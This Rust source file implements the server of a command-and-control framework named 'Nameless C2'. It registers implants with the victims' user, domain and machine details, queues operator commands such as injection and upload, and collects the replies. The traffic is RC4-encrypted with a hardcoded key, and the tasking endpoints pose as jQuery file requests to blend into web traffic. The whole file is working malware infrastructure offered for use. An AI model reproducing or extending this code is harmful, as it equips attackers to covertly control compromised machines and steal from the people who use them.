use actix_web::{get, post, web::{Json, Bytes}, App, HttpResponse, HttpServer, Responder, body::MessageBody};
use rusqlite::{params, Connection};
use serde::{Deserialize, Serialize};
use std::{fs::OpenOptions, error::Error};
use std::io::Write;
use chrono::{DateTime, Utc, Local, TimeZone};
use crypto::symmetriccipher::SynchronousStreamCipher;
use actix_web::web::PayloadConfig;
use hex;
use std::borrow::Cow;

#[derive(Debug, Serialize, Deserialize)]
struct implants {
    implant_id: String,
    username: String,
    domain: String,
    machine: String,
    process: String,
    versionOS: String,
    arch: String,
    pid: String
}

#[derive(Debug, Serialize, Deserialize)]
struct setTask {
    implant_id: String,
    operator_id: String,
    taskcmd: String,
    taskresponse: String,
    completedtask: String,
}

#[derive(Debug, Serialize, Deserialize)]
struct getTask {
    id: i32,
    implant_id: String,
    operator_id: String,
    taskcmd: String,
    taskresponse: String,
    completedtask: String,
}

#[derive(Serialize, Clone, Debug)]
struct DBImplant {
    id: u32,
    implant_id: String,
    username: String,
    domain: String,
    machine: String,
    process: String,
    versionOS: String,
    arch: String,
    pid: String,
    lastcheckin: String,
    dead: String,
    naptime: i32
}

fn epoch_to_datetime(epoch: i64) -> DateTime<Local> {
    Local.timestamp(epoch, 0)
}

#[post("/register")]
async fn register_implants(implants: Bytes) -> impl Responder {
    let mut cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
    let mut dec_implants = implants.to_vec();
    cipher.process(&implants[..],  &mut dec_implants);
    let dec_implants_struct: implants = serde_json::from_slice(&dec_implants).unwrap();
    let dec_implants_json: Json<implants> = Json(dec_implants_struct);

    let dt = Utc::now();
    let timestamp: i64 = dt.timestamp();
    let conn = Connection::open("database.db").unwrap();
    conn.execute(
        "INSERT INTO implants (implant_id, username, domain, machine, process ,versionOS, arch, pid, lastcheckin, dead, naptime) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11)",
        params![dec_implants_json.implant_id, dec_implants_json.username, dec_implants_json.domain, dec_implants_json.machine, dec_implants_json.process, dec_implants_json.versionOS, dec_implants_json.arch, dec_implants_json.pid, timestamp, "NO", 40],
    ).unwrap();

    let mut file = OpenOptions::new()
    .create(true)
    .append(true)
    .open("NamelessLog.txt")
    .unwrap();

    let data = format!("[+] New Implant Received: {} at {} | {}\\{}@{} \r\n\r\n", dec_implants_json.implant_id, epoch_to_datetime(timestamp).format("%Y-%m-%d %H:%M:%S").to_string(), dec_implants_json.domain, dec_implants_json.username, dec_implants_json.machine);
    file.write_all(data.as_bytes()).unwrap();

    HttpResponse::Ok().finish()
}

#[post("/jquery-3.6.3.min.js")]
async fn get_tasks(implant_id_enc: Bytes) -> impl Responder {
    let mut cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
    let mut implant_id_dec = implant_id_enc.to_vec();
    cipher.process(&implant_id_enc[..],  &mut implant_id_dec);
    let dec_implant_id_ascii = std::str::from_utf8(&implant_id_dec).unwrap();
    let dt = Utc::now();
    let timestamp: i64 = dt.timestamp();
    let conn = Connection::open("database.db").unwrap();
    conn.execute(
        "UPDATE implants SET lastcheckin = ?1, dead = ?2 WHERE implant_id = ?3",
        params![timestamp, "NO", dec_implant_id_ascii]
    ).unwrap();

    let task = conn.query_row(
        "SELECT * FROM tasks WHERE completedtask = 'NO' AND implant_id = ?1 ORDER BY ID LIMIT 1",
        params![dec_implant_id_ascii],
        |row| {
            let completed: String = row.get(5)?;
            if completed == "NO" {
                Ok(getTask {
                    id: row.get(0)?,
                    implant_id: row.get(1)?,
                    operator_id: row.get(2)?,
                    taskcmd: row.get(3)?,
                    taskresponse: row.get(4)?,
                    completedtask: completed,
                })
            } else {
                Err(rusqlite::Error::QueryReturnedNoRows)
            }
        },
    );

    match task {
        Ok(task) => {
            let mut taskid_cmd = Vec::new();
            taskid_cmd.extend(task.id.to_string().as_bytes());
            taskid_cmd.extend(":".as_bytes());
            taskid_cmd.extend(task.taskcmd.as_bytes());
            cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
            let mut taskcmd_enc = taskid_cmd.clone();
            cipher.process(&taskid_cmd,  &mut taskcmd_enc);
            HttpResponse::Ok().body(taskcmd_enc)
        },
        Err(_) => {
            let body = vec![0u8; 8];
            HttpResponse::Ok().body(body)
        }
    }
}

#[post("/set_task")]
async fn set_tasks(task: Json<setTask>) -> impl Responder {
    let dt = Utc::now();
    let timestamp: i64 = dt.timestamp();
    let conn = Connection::open("database.db").unwrap();
    if !task.taskcmd.contains("exit"){
        conn.execute(
            "INSERT INTO tasks (implant_id, operator_id, taskcmd, taskresponse, completedtask) VALUES (?1, ?2, ?3, ?4, ?5)",
            params![task.implant_id, task.operator_id, task.taskcmd, task.taskresponse, task.completedtask], 
        ).unwrap();
    } else {
        conn.execute(
            "INSERT INTO tasks (implant_id, operator_id, taskcmd, taskresponse, completedtask) VALUES (?1, ?2, ?3, ?4, ?5)",
            params![task.implant_id, task.operator_id, task.taskcmd, task.taskresponse, "YES"], 
        ).unwrap();
    }


    let task = conn.query_row(
        "SELECT * FROM tasks ORDER BY ID DESC LIMIT 1",
        [],
        |row| {
            Ok(getTask {
                id: row.get(0)?,
                implant_id: row.get(1)?,
                operator_id: row.get(2)?,
                taskcmd: row.get(3)?,
                taskresponse: row.get(4)?,
                completedtask: row.get(5)?,
            })
        },
    ).unwrap();

    let mut file = OpenOptions::new()
    .create(true)
    .append(true)
    .open("NamelessLog.txt")
    .unwrap();

    let data_out = String::from_utf8(base64::decode(task.taskcmd.clone()).unwrap()).unwrap();
    if !data_out.contains("inj") || !data_out.contains("upload"){
        let data = format!("Task ID: {} From: {} With Task: '{}' On Implant: {} at: {}\r\n\r\n", task.id, task.operator_id, String::from_utf8(base64::decode(task.taskcmd).unwrap()).unwrap(), task.implant_id, epoch_to_datetime(timestamp).format("%Y-%m-%d %H:%M:%S").to_string());
        file.write_all(data.as_bytes()).unwrap();
    }
    else {
        let data_out_40: String = data_out.chars().take(40).collect();
        let data = format!("Task ID: {} From: {} With Task: '{}' On Implant: {} at: {}\r\n\r\n", task.id, task.operator_id, data_out_40, task.implant_id, epoch_to_datetime(timestamp).format("%Y-%m-%d %H:%M:%S").to_string());
        file.write_all(data.as_bytes()).unwrap();
    }

    HttpResponse::Ok().body(task.id.to_string())
}

#[post("/jquery.js")]
async fn get_cmd_reply(cmd_reply: Bytes) -> impl Responder {
    let mut cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
    let mut cmd_reply_dec = cmd_reply.to_vec();
    cipher.process(&cmd_reply[..],  &mut cmd_reply_dec);
    let cmd_reply_dec_ascii = std::str::from_utf8(&cmd_reply_dec).unwrap();
    let cmd_reply_dec_ascii_vec: Vec<&str> = cmd_reply_dec_ascii.split(':').collect();

    let dt = Utc::now();
    let timestamp: i64 = dt.timestamp();
    let conn = Connection::open("database.db").unwrap();
    conn.execute(
        "UPDATE tasks SET taskresponse = ?1, completedtask = ?2 WHERE id = ?3",
        params![cmd_reply_dec_ascii_vec[1], "YES", cmd_reply_dec_ascii_vec[0].parse::<i32>().unwrap()], 
    ).unwrap();

    let task = conn.query_row(
        "SELECT * FROM tasks WHERE id = ?1",
        params![cmd_reply_dec_ascii_vec[0].parse::<i32>().unwrap()],
        |row| {
            Ok(getTask {
                id: row.get(0)?,
                implant_id: row.get(1)?,
                operator_id: row.get(2)?,
                taskcmd: row.get(3)?,
                taskresponse: row.get(4)?,
                completedtask: row.get(5)?,
            })
        },
    ).unwrap();

    let mut file = OpenOptions::new()
    .create(true)
    .append(true)
    .open("NamelessLog.txt")
    .unwrap();

    
    
    let taskresponse_str = match String::from_utf8_lossy(&base64::decode(&task.taskresponse).unwrap()) {
        Cow::Owned(s) => s,
        Cow::Borrowed(b) => format!("{}", b),
    };



    let data_out = String::from_utf8(base64::decode(task.taskcmd.clone()).unwrap()).unwrap();
    if !data_out.contains("inj") || !data_out.contains("upload"){
        let data = format!("Reply from Task ID: {} From: {} With Task: '{}' On Implant: {} at: {}\r\n\r\n{}\r\n\r\n", task.id, task.operator_id, String::from_utf8(base64::decode(task.taskcmd).unwrap()).unwrap(), task.implant_id, epoch_to_datetime(timestamp).format("%Y-%m-%d %H:%M:%S").to_string(),taskresponse_str);
        file.write_all(data.as_bytes()).unwrap();
    }
    else {
        let data_out_40: String = data_out.chars().take(40).collect();
        let data = format!("Reply from Task ID: {} From: {} With Task: '{}' On Implant: {} at: {}\r\n\r\n{}\r\n\r\n", task.id, task.operator_id, data_out_40, task.implant_id, epoch_to_datetime(timestamp).format("%Y-%m-%d %H:%M:%S").to_string(),taskresponse_str);
        file.write_all(data.as_bytes()).unwrap();
    }
    
    HttpResponse::Ok().finish()
}

#[get("/info")]
async fn info() -> impl Responder {
    let dt = Utc::now();
    let timestamp: i64 = dt.timestamp();
    let conn = Connection::open("database.db").unwrap();
    let mut statement = conn
        .prepare("SELECT * FROM implants ORDER BY id")
        .unwrap();
    let rows = statement.query_map([], |row| {
        Ok(DBImplant {
            id: row.get(0)?,
            implant_id: row.get(1)?,
            username: row.get(2)?,
            domain: row.get(3)?,
            machine: row.get(4)?,
            process: row.get(5)?,
            versionOS: row.get(6)?,
            arch: row.get(7)?,
            pid: row.get(8)?,
            lastcheckin: row.get(9)?,
            dead: row.get(10)?,
            naptime: row.get(11)?
        })
    }).unwrap();

    let implants: Vec<DBImplant> = rows.map(|r| r.unwrap()).collect();
    let mut modified_implants = implants.clone();

    for mut implant in &mut modified_implants{
        if ((timestamp-implant.lastcheckin.parse::<i64>().unwrap())/implant.naptime as i64) > 2  {
            implant.dead = "YES".to_owned();
            conn.execute(
                "UPDATE implants SET dead = ?1 WHERE implant_id = ?2",
                params!["YES", implant.implant_id]
            ).unwrap();
        }
    }

    HttpResponse::Ok().json(modified_implants)
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    // `openssl req -x509 -newkey rsa:4096 -nodes -keyout key.pem -out cert.pem -days 365 -subj '/CN=localhost'`
    println!(
        r###"███╗   ██╗ █████╗ ███╗   ███╗███████╗██╗     ███████╗███████╗███████╗     ██████╗██████╗ 
████╗  ██║██╔══██╗████╗ ████║██╔════╝██║     ██╔════╝██╔════╝██╔════╝    ██╔════╝╚════██╗
██╔██╗ ██║███████║██╔████╔██║█████╗  ██║     █████╗  ███████╗███████╗    ██║      █████╔╝
██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══╝  ██║     ██╔══╝  ╚════██║╚════██║    ██║     ██╔═══╝ 
██║ ╚████║██║  ██║██║ ╚═╝ ██║███████╗███████╗███████╗███████║███████║    ╚██████╗███████╗
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝     ╚═════╝╚══════╝
                                                                                         "###);

    println!("\r\n");
    println!("[+] Starting Nameless Server\r\n");
    let conn = Connection::open("database.db").unwrap();
    let schema = std::fs::read_to_string("schema.sql").expect("Failed to read schema file");
    conn.execute_batch(&schema).unwrap();
    HttpServer::new(move || {
        App::new()
            .service(register_implants)
            .service(get_tasks)
            .service(set_tasks)
            .service(info)
            .service(get_cmd_reply)
            .data(PayloadConfig::new(10485760))
    })
    .bind_openssl("0.0.0.0:443", {
        let mut builder = openssl::ssl::SslAcceptor::mozilla_intermediate(openssl::ssl::SslMethod::tls()).unwrap();
        builder.set_private_key_file("key.pem", openssl::ssl::SslFiletype::PEM).unwrap();
        builder.set_certificate_chain_file("cert.pem").unwrap();
        builder
    })?
    .run()
    .await
}
